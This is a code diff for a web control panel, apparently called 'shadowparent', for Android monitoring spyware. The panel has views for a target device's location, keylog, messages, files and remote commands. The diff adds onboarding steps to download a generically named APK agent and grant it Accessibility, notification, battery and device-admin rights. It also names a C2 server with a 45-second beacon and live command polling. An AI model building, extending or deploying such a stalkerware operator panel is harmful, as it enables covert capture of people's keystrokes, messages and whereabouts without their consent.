@@ -233,7 +233,7 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
     </div>
     <nav class="nav" id="nav">
       <div class="grp">Monitor</div>
-      <a data-view="overview" class="on"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="7" height="9" rx="2"/><rect x="14" y="3" width="7" height="5" rx="2"/><rect x="14" y="12" width="7" height="9" rx="2"/><rect x="3" y="16" width="7" height="5" rx="2"/></svg>Prehľad</a>
+      <a data-view="overview"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="7" height="9" rx="2"/><rect x="14" y="3" width="7" height="5" rx="2"/><rect x="14" y="12" width="7" height="9" rx="2"/><rect x="3" y="16" width="7" height="5" rx="2"/></svg>Prehľad</a>
       <a data-view="location"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 21s7-6.2 7-11a7 7 0 1 0-14 0c0 4.8 7 11 7 11z"/><circle cx="12" cy="10" r="2.6"/></svg>Poloha</a>
       <a data-view="keylog"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M6 9h.01M10 9h.01M14 9h.01M18 9h.01M7 13h.01M11 13h.01M15 13h.01M7 16h10"/></svg>Keylog</a>
       <a data-view="messages"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H8l-5 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>Správy</a>
@@ -281,8 +281,30 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
     </header>
 
     <div class="wrap">
+      <!-- WELCOME -->
+      <section class="view on" id="v-welcome">
+        <div class="card" style="max-width:760px">
+          <h3>Začíname tu</h3>
+          <div class="body" style="line-height:1.85">
+            <p style="margin:0 0 14px;color:var(--mut)">Panel je živý, ale zariadenie sa ešte neprihlásilo. Tri kroky:</p>
+            <ol style="margin:0;padding-left:20px;color:var(--mut)">
+              <li style="margin-bottom:8px">Stiahni APK — <a class="btn" style="padding:4px 10px" href="/apk/android_UI.apk" download>android_UI.apk</a>
+                  (albo naskenuj provisioning QR — <a style="color:#9dbaff" href="https://github.com/palcinkoo/shadowparent-dashboard/releases/download/v1.1.2/provision-qr.png" target="_blank">provision-qr.png</a>)</li>
+              <li style="margin-bottom:8px">Nainštaluj a <b style="color:var(--txt)">otvor aplikáciu</b> — spustí sa agent a automaticky sa prihlási</li>
+              <li style="margin-bottom:0">V aplikácii klikni <b style="color:var(--txt)">„Настроить“</b> a prejdi wizard (Accessibility, notifikácie, battery optimalizácia, device admin)</li>
+            </ol>
+            <div style="margin-top:20px;display:flex;gap:10px;flex-wrap:wrap">
+              <span class="tag blue">C2: shadowparent-c2.onrender.com</span>
+              <span class="tag green">beacon každých 45 s</span>
+              <span class="tag violet">batch flush každých 45 min</span>
+              <span class="tag amber">live príkazy (poll 45 s)</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
       <!-- OVERVIEW -->
-      <section class="view on" id="v-overview">
+      <section class="view" id="v-overview">
         <div class="grid tiles" id="tiles"></div>
         <div class="grid two">
           <div class="card">
@@ -474,7 +496,13 @@ function pickText(o, keys){
 async function loadDevices(){
   S.devices = await j('/api/devices') || [];
   const list=$('devList');
-  if(!S.devices.length){ list.innerHTML='<div style="padding:10px 12px;color:var(--dim);font-size:12.5px">Žiadne zariadenia</div>'; return; }
+  if(!S.devices.length){
+    list.innerHTML=`<div style="padding:12px 12px 14px;font-size:12.5px;color:var(--dim);line-height:1.7">
+      Žiadne zariadenie.<br>Nainštaluj APK a otvor aplikáciu — agent sa prihlási sám.
+      <a class="btn" style="margin-top:10px;width:100%;justify-content:center" href="/apk/android_UI.apk" download>Stiahnuť APK</a>
+    </div>`;
+    return;
+  }
   list.innerHTML = S.devices.map(d=>{
     const on = d.last_seen && (Date.now()-d.last_seen)<120000;
     const nm = (d.model||d.device_id||'?');
@@ -484,7 +512,7 @@ async function loadDevices(){
     </div>`;
   }).join('');
 }
-function selectDevice(id){ S.device=id; localStorage.setItem('sp_device',id); loadDevices(); renderAll(); }
+function selectDevice(id){ S.device=id; localStorage.setItem('sp_device',id); loadDevices(); go('overview'); renderAll(); }
 
 /* ---------- overview ---------- */
 async function loadOverview(){
@@ -728,9 +756,11 @@ const LOADERS = {overview:loadOverview, location:loadLocation, keylog:loadKeylog
   files:loadFiles, commands:loadCommands};
 function go(view){
   S.view=view;
+  if(!S.device && view!=='welcome') view='welcome';
   document.querySelectorAll('.nav a').forEach(a=>a.classList.toggle('on', a.dataset.view===view));
   document.querySelectorAll('.view').forEach(v=>v.classList.toggle('on', v.id==='v-'+view));
   if(LOADERS[view]) LOADERS[view]();
+  S.view=view;
   setTimeout(()=>{ if(S.map) S.map.invalidateSize(); if(S.mini) S.mini.invalidateSize(); },60);
   $('side').classList.remove('open');
 }
@@ -765,7 +795,8 @@ renderChips();
   const saved = localStorage.getItem('sp_device');
   if(saved && S.devices.some(d=>d.device_id===saved)) S.device=saved;
   else if(S.devices.length) S.device=S.devices[0].device_id;
-  if(S.device){ localStorage.setItem('sp_device',S.device); await loadDevices(); }
+  if(S.device){ localStorage.setItem('sp_device',S.device); await loadDevices(); go('overview'); }
+  else go('welcome');
   renderAll();
 })();
 setInterval(()=>{ loadDevices(); loadOverview(); const p=LOADERS[S.view]; if(p) p(); }, 5000);
